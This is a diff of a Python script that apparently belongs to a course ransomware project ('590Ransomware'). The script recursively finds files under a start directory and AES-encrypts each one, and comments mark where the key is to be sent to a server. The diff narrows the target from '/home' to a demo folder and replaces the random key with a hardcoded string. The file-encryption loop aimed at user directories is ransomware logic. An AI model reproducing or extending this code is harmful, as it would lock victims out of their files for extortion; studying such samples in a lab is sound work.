@@ -1,5 +1,4 @@
-#!/usr/bin/env python
-# coding=UTF-8
+
 import base64
 
 
@@ -12,7 +11,7 @@ from Crypto import Random
 
 import file_finder
 
-#Encryption and decryption functions adapted from: https://stackoverflow.com/questions/20852664/python-pycrypto-encrypt-decrypt-text-files-with-aes
+#Encryption and decryption functions adapted from: https://stackoverflow.com/#questions/20852664/python-pycrypto-encrypt-decrypt-text-files-with-aes
 
 
 def pad(s):
@@ -46,21 +45,24 @@ def beginFileModification(key, cryptoFunc):
 
 	#send key back
 	#change directory accordingly
-	startDirectory = ['/home']
+	startDirectory = ['/home/rayan/encryptiondemo']
 	for currentDirectory in startDirectory:
 		for file in file_finder.findFiles(currentDirectory):
 			performCrypto(file, key, cryptoFunc)
+			
 
 		
 if __name__ == '__main__':
 	#encrypt file and then decrtypt
-	key = generateEncryptionKey(16)
+	#key = generateEncryptionKey(16)
+	#print(key)
+	key = "this is a key123"
 	#send generated key here to server
 
+#	beginFileModification(key, decrypt)
 
-	filePath = "C:/Users/rayan/590Ransomware/map.png"
-	performCrypto(filePath, key, encrypt)
-	performCrypto(filePath, key, decrypt)
+	#EperformCrypto(filePath, key, encrypt)
+	#performCrypto(filePath, key, decrypt)
 
 
 
